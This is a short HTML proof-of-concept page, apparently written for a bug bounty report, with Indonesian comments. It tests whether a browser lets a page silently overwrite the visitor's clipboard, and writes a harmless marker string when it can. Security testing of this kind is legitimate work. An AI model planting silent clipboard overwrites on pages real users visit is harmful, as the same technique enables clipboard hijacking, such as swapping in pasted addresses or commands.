@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clipboard Write PoC</title>
+</head>
+<body>
+  <h2>Clipboard Write PoC</h2>
+  <p>Kalau vuln, text di clipboard kamu bakal langsung ke-replace tanpa prompt/interaction.</p>
+
+  <script>
+    // coba overwrite clipboard user
+    navigator.clipboard.writeText("Hacked by Arya - BugBounty PoC")
+      .then(() => {
+        console.log("Clipboard sukses ditulis!");
+        alert("✅ Clipboard berhasil di-overwrite. Coba paste (CTRL+V).");
+      })
+      .catch(err => {
+        console.error("Gagal nulis ke clipboard:", err);
+        alert("❌ Clipboard write gagal: " + err);
+      });
+  </script>
+</body>
+</html>
